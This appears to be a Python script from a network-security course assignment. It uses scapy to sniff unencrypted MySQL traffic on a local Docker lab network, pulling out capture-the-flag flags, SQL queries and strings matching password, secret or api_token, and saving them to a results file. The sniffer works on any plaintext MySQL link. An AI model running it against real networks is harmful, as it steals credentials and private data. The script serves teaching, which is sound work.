#!/usr/bin/env python3
"""
MITM Traffic Capture & Analysis Tool
Assignment 2: Network Security

This script captures and analyses network traffic between the web application
and the MySQL database, demonstrating that the connection is unencrypted.

Usage (requires root/sudo):
    sudo python3 capture.py --interface <docker_bridge_interface>
    sudo python3 capture.py --interface br-<network_id> --count 50
    sudo python3 capture.py --pcap capture.pcap   # analyse existing pcap

Prerequisites:
    pip install scapy
"""

import argparse
import os
import re
import sys
import time
from datetime import datetime

try:
    from scapy.all import IP, TCP, Raw, rdpcap, sniff
except ImportError:
    print("[!] scapy is required. Install with: pip install scapy")
    print("[!] Also requires root/sudo to capture packets.")
    sys.exit(1)


# Patterns to look for in captured traffic
FLAG_PATTERN = re.compile(r"FLAG\{[^}]+\}")
SQL_PATTERN = re.compile(r"(SELECT|INSERT|UPDATE|DELETE|CREATE|DROP|GRANT|FLUSH)\s", re.IGNORECASE)
SENSITIVE_PATTERNS = [
    re.compile(r"api_token", re.IGNORECASE),
    re.compile(r"secret", re.IGNORECASE),
    re.compile(r"password", re.IGNORECASE),
    re.compile(r"flag", re.IGNORECASE),
]

# Tracking captured data
captured_data = {
    "flags": [],
    "sql_queries": [],
    "credentials": [],
    "sensitive_strings": [],
    "packet_count": 0,
    "mysql_packets": 0,
}


def analyse_payload(payload_bytes, src_ip, dst_ip, src_port, dst_port):
    """Analyse a packet payload for sensitive information."""
    try:
        payload = payload_bytes.decode("utf-8", errors="replace")
    except Exception:
        return

    captured_data["mysql_packets"] += 1

    # Look for flags
    flags = FLAG_PATTERN.findall(payload)
    for flag in flags:
        if flag not in captured_data["flags"]:
            captured_data["flags"].append(flag)
            print(f"\n{'='*60}")
            print(f"  *** FLAG CAPTURED: {flag} ***")
            print(f"  Source: {src_ip}:{src_port} -> {dst_ip}:{dst_port}")
            print(f"  Time: {datetime.now().strftime('%H:%M:%S')}")
            print(f"{'='*60}\n")

    # Look for SQL queries
    sql_matches = SQL_PATTERN.findall(payload)
    if sql_matches:
        # Extract the full query (best-effort)
        clean = payload.replace("\x00", "").strip()
        if len(clean) > 10:
            entry = {
                "time": datetime.now().strftime("%H:%M:%S"),
                "direction": f"{src_ip}:{src_port} -> {dst_ip}:{dst_port}",
                "snippet": clean[:300],
            }
            captured_data["sql_queries"].append(entry)
            print(f"  [SQL] {entry['direction']}")
            print(f"         {clean[:120]}")

    # Look for sensitive data
    for pattern in SENSITIVE_PATTERNS:
        if pattern.search(payload):
            clean = payload.replace("\x00", "").strip()
            if clean and clean not in captured_data["sensitive_strings"]:
                captured_data["sensitive_strings"].append(clean[:300])


def packet_handler(packet):
    """Process each captured packet."""
    captured_data["packet_count"] += 1

    if not packet.haslayer(TCP) or not packet.haslayer(Raw):
        return

    tcp = packet[TCP]
    raw = packet[Raw].load

    # Filter for MySQL traffic (port 3306)
    if tcp.dport == 3306 or tcp.sport == 3306:
        src_ip = packet[IP].src if packet.haslayer(IP) else "?"
        dst_ip = packet[IP].dst if packet.haslayer(IP) else "?"
        analyse_payload(raw, src_ip, dst_ip, tcp.sport, tcp.dport)


def live_capture(interface, count, output_pcap=None):
    """Perform live packet capture on the specified interface."""
    print(f"[*] Starting live capture on interface: {interface}")
    print(f"[*] Filtering for MySQL traffic (port 3306)")
    print(f"[*] Capture limit: {count} packets")
    print(f"[*] Press Ctrl+C to stop early")
    print()
    print("[!] TIP: Open http://localhost:5001 in your browser and click")
    print("[!]       'API: Secrets' to generate database traffic containing flags.")
    print()

    try:
        packets = sniff(
            iface=interface,
            filter="tcp port 3306",
            prn=packet_handler,
            count=count,
            store=True,
        )

        if output_pcap:
            from scapy.all import wrpcap

            wrpcap(output_pcap, packets)
            print(f"\n[*] Packets saved to {output_pcap}")

    except PermissionError:
        print("[!] Permission denied. Run with sudo:")
        print(f"[!]   sudo python3 capture.py --interface {interface}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[*] Capture stopped by user")


def analyse_pcap(pcap_file):
    """Analyse an existing pcap file."""
    print(f"[*] Analysing pcap file: {pcap_file}")

    packets = rdpcap(pcap_file)
    print(f"[*] Loaded {len(packets)} packets")

    for packet in packets:
        packet_handler(packet)


def print_summary():
    """Print summary of captured/analysed data."""
    print(f"\n{'='*60}")
    print("  CAPTURE SUMMARY")
    print(f"{'='*60}")
    print(f"  Total packets processed: {captured_data['packet_count']}")
    print(f"  MySQL packets with data: {captured_data['mysql_packets']}")
    print(f"  SQL queries captured:    {len(captured_data['sql_queries'])}")
    print(f"  Flags found:             {len(captured_data['flags'])}")
    print(f"  Sensitive strings:       {len(captured_data['sensitive_strings'])}")

    if captured_data["flags"]:
        print(f"\n  --- CAPTURED FLAGS ---")
        for flag in captured_data["flags"]:
            print(f"  >>> {flag}")

    if captured_data["sql_queries"]:
        print(f"\n  --- SQL QUERIES (first 10) ---")
        for i, q in enumerate(captured_data["sql_queries"][:10]):
            print(f"  [{q['time']}] {q['snippet'][:100]}")

    if captured_data["sensitive_strings"]:
        print(f"\n  --- SENSITIVE DATA SNIPPETS ---")
        for s in captured_data["sensitive_strings"][:10]:
            clean = s[:120].replace("\n", " ")
            print(f"  > {clean}")

    print(f"\n{'='*60}")

    # Save results to file
    results_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "mitm_results.txt")
    with open(results_file, "w") as f:
        f.write(f"MITM Capture Results - {datetime.now().isoformat()}\n")
        f.write(f"{'='*60}\n\n")
        f.write(f"Total packets: {captured_data['packet_count']}\n")
        f.write(f"MySQL packets: {captured_data['mysql_packets']}\n\n")

        if captured_data["flags"]:
            f.write("CAPTURED FLAGS:\n")
            for flag in captured_data["flags"]:
                f.write(f"  {flag}\n")
            f.write("\n")

        if captured_data["sql_queries"]:
            f.write("SQL QUERIES:\n")
            for q in captured_data["sql_queries"]:
                f.write(f"  [{q['time']}] {q['snippet'][:200]}\n")
            f.write("\n")

        if captured_data["sensitive_strings"]:
            f.write("SENSITIVE DATA:\n")
            for s in captured_data["sensitive_strings"]:
                f.write(f"  {s[:200]}\n")

    print(f"[*] Results saved to {results_file}")


def find_docker_interface():
    """Try to find the Docker bridge interface for the vulnerable network."""
    import subprocess

    try:
        result = subprocess.run(
            ["docker", "network", "inspect", "2_network_vulnerable_network",
             "--format", "{{.Id}}"],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0:
            net_id = result.stdout.strip()[:12]
            iface = f"br-{net_id}"
            print(f"[*] Auto-detected Docker bridge interface: {iface}")
            return iface
    except Exception:
        pass

    # Fallback: try docker0
    return "docker0"


def parse_args():
    parser = argparse.ArgumentParser(
        description="MITM Traffic Capture & Analysis for Network Security Assignment",
    )
    parser.add_argument(
        "--interface", "-i",
        help="Network interface to capture on (e.g., br-abc123, docker0). Auto-detected if not specified.",
    )
    parser.add_argument(
        "--pcap",
        help="Analyse an existing pcap file instead of live capture",
    )
    parser.add_argument(
        "--count", "-c", type=int, default=100,
        help="Number of packets to capture (default: 100)",
    )
    parser.add_argument(
        "--output", "-o",
        help="Save captured packets to pcap file",
    )
    return parser.parse_args()


def main():
    args = parse_args()

    print("=" * 60)
    print("  MITM Traffic Capture - Network Security Assignment 2")
    print("=" * 60)
    print()

    if args.pcap:
        analyse_pcap(args.pcap)
    else:
        interface = args.interface or find_docker_interface()
        live_capture(interface, args.count, args.output)

    print_summary()


if __name__ == "__main__":
    main()
